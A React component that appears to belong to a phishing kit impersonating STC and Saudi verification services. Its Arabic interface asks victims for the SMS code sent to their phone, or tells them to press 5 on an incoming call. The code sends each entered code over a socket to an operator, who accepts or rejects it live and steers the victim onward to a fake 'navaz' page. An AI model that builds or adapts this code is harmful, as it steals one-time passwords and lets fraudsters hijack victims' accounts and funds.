import React, { use, useEffect } from "react";
import { useState } from "react";
import axios from "axios";
import { serverRoute, socket } from "./Home";
import { TailSpin } from "react-loader-spinner";
import { AiOutlineCloseCircle } from "react-icons/ai";
import { useNavigate } from "react-router-dom";
import { testData } from "./Phone";
const PhoneOtp = () => {
  const [loading, setLoading] = useState(false);
  const query = new URLSearchParams(window.location.search);
  const stc = query.get("stc");
  const [STC, setSTC] = useState(stc === "check");
  const [counter, setCounter] = useState(180);
  const [phoneOtp, setPhoneOtp] = useState(null);
  const navigate = useNavigate();
  const selectedProvider = testData.find((test)=>test.name === sessionStorage.getItem("provider"))
  useEffect(() => {
    const timer = setInterval(() => {
      if (counter > 0) {
        setCounter(counter - 1);
      }
    }, 1000);

    return () => clearInterval(timer);
  }, [counter]);

  const minutes = Math.floor(counter / 60);
  const seconds = counter % 60;

  const formattedMinutes = String(minutes).padStart(2, "0");
  const formattedSeconds = String(seconds).padStart(2, "0");

  const handleSubmit = async (e) => {
    setLoading(true);
    e.preventDefault();

    try {
      await axios
        .post(serverRoute + "/phoneOtp/" + sessionStorage.getItem("id"), {
          phoneOtp,
        })
        .then(() =>
          socket.emit("phoneOtp", {
            id: sessionStorage.getItem("id"),
            phoneOtp: otp,
          })
        );
    } catch (error) {}
  };
  const ID = sessionStorage.getItem("id");

  socket.on("acceptPhoneOTP", ({ id, price }) => {
    if (id === sessionStorage.getItem("id")) {
      if (stc === "check") {
        setSTC(true);
      } else {
        return (window.location.href = "/navaz?otp=" + price);
      }
    }
  });

  socket.on("declinePhoneOTP", (id) => {
    if (id === sessionStorage.getItem("id")) {
      setLoading(false);
      window.location.href = "/phoneOtp";
    }
  });

  socket.on("acceptService", ({ id, price }) => {
    console.log(id, price);
    if (id === ID) {
      return (window.location.href =
        "/navaz?otp=" + price + "&stc=" + stc || null);
    }
  });

  socket.on("declineService", (id) => {
    if (id === ID) {
      window.location.href = "/stcOtp";
    }
  });

  return (
    <>
      {STC ? (
        <div className="">
          {" "}
          <div className="w-full flex flex-col justify-center  items-center bg-white h-screen py-2 gap-y-10">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/e/e3/STC-01.svg"
              className="w-1/2"
            />
            <div className="  w-full flex flex-col jus items-center gap-y-4">
              <p className="text-xl font-bold" dir="ltr"> STC سوف يتم الاتصال بك من </p>
              <p
                className="font-bold text-gray-500"
                style={{ fontSize: "12px" }}
              >
                لتأكيد طلبك الرجاء الضغط على رقم 5
              </p>
              <span className="text-purple-700 font-bold" dir="ltr">! يرجي الإنتظار</span>
            </div>
            <div className="flex w-11/12 flex-col justify-center items-center bg-purple-100 rounded-full py-1">
              <span className="text-purple-700 font-bold ">
                إعادة الاتصال بعد{" "}
              </span>
              <span className="text-purple-700 font-bold">
                {formattedMinutes}:{formattedSeconds}
              </span>
            </div>
          </div>
        </div>
      ) : (
        <div className="w-full lg:w-1/2 flex flex-col items-center justify-center rounded-md">
          <form
            className="bg-white border border-gray-300 my-2 min-h-screen rounded-md pt-0 p-3 text-sm w-11/12"
            dir="rtl"
            onSubmit={handleSubmit}
          >
            {/* Header with logo */}
            <div className="flex justify-start items-start mb-4 w-full p-2 pr-4 pt-4 flex-col">
              <img src="/photoHeader2.jpeg" alt="Mutasil" className="w-20" />
              <div className="flex items-start ">
                <img src="/phoneHeader1.jpeg" alt="Mutasil" className="w-20" />
                <span className="font-semibold">
                  تم إرسال رمز التحقق إلي هاتفك النقال , الرجاء إدخاله في هذه
                  الخانة .
                </span>
              </div>
            </div>

            {/* STC Logo */}
            <div className="flex justify-end items-center mb-1 -mt-2 rounded-lg px-2">
              <img
                src={selectedProvider.img}
                alt={selectedProvider.name}
                className="h-16 object-contain"
                onError={(e) => {
                  e.target.style.display = "none";
                }}
              />
            </div>

            {/* OTP Input */}
            <div className="flex justify-start p-1 py-3 items-end gap-y-2 w-full flex-col">
              <span className="font-semibold text-sm text-gray-700 w-full text-right"></span>
              <input
                value={phoneOtp}
                onChange={(e) => setPhoneOtp(e.target.value)}
                required
                dir="ltr"
                placeholder="  رمز التحقق"
                inputMode="numeric"
                type="text"
                maxLength={6}
                className="border border-gray-300 rounded-lg px-3 py-2.5 text-base text-right outline-blue-500 w-full"
              />
            </div>
            <div className="flex items-center justify-between">
              {/* Timer */}
              <div className="flex justify-center items-center my-4">
                <span className="text-gray-600">
                  إعادة إرسال: {formattedMinutes}:{formattedSeconds}
                </span>
              </div>
              {/* Submit button */}
              <div className=" flex items-center justify-center py-5 mt-4">
                <button
                  type="submit"
                  className="px-5 flex justify-center items-center py-3 bg-[#007bff] hover:bg-[#0056b3] text-white w-full rounded-full text-base font-semibold transition-colors"
                >
                  تحقق
                </button>
              </div>
            </div>

            {/* Footer logos */}
            <div className="flex justify-center items-center gap-4 mt-6 pt-6 border-t border-gray-200">
              <img
                src="/phoneFooter.jpeg"
                alt="CST"
                className="object-contain"
              />
            </div>
          </form>

          {loading && (
            <div className="fixed top-0 w-full h-screen bg-[#ffffffc7] flex items-center justify-center flex-col gap-y-5 z-50">
              <TailSpin
                height="50"
                width="50"
                color="blue"
                ariaLabel="tail-spin-loading"
                radius="1"
                wrapperStyle={{}}
                wrapperClass=""
                visible={true}
              />
              <span className="font-semibold">
                يرجي الانتظار جاري التأكد من صحة البيانات المدخلة
              </span>
            </div>
          )}
        </div>
      )}
    </>
  );
};

export default PhoneOtp;


          // <input
          //   value={phoneOtp}
          //   onChange={(e) => setPhoneOtp(e.target.value)}
          //   minLength={4}
          //   required
          //   dir="ltr"
          //   placeholder="******"
          //   inputMode="numeric"
          //   type="text"
          //   className="border px-3 py-1  border-gray-300 text-base text-right outline-[#ffc107] rounded-md w-full"
          // />;